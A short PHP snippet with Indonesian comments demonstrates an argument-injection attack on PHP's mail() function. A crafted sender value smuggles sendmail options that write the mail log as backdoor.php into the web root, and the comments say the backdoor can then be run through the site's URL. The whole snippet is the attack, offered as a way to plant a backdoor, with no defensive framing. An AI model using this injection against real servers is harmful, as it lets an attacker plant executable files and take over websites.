<?php

// untuk menulis kode program berbahaya ke dalam root
$input = 'yourfrind@example.com -OQueueDirectory=/tmp -X/var/www/html/backdoor.php';

mail("myfriend@example.com", "subject", "message", "", "-f" . $input);
// jika email terkirim, backdoor akan bisa di eksekusi
// www.halo.com?backdoor.php